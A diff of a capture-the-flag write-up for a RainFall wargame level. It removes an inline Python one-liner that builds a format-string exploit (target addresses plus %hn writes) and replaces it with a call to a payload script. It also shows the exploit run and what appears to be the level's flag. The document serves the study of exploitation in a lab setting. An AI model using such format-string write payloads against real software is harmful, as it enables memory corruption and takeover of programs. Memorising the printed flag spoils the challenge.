@@ -49,11 +49,9 @@ Breakpoint 1, 0x08048450 in p ()
 # The first address will be popped off the stack when entering the stack frame
 # of printf, so the starting bytes of the buffer will be at $esp + 12.
 
-# This is the payload :
-level4@RainFall:~$ python -c "import struct;
-tlow = struct.pack('I', 0x8049810) <== low order bytes of target global var
-thi = struct.pack('I', 0x8049812) <== high order bytes
-print thi + tlow + '%250x' + '%12\$hn' + '%21570x' + '%13\$hn'" > /tmp/bad
+# Finally :
+#
+level4@RainFall:~$ python /tmp/payload.py > /tmp/bad
 level4@RainFall:~$ cat /tmp/bad - | ./level4
 ...
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
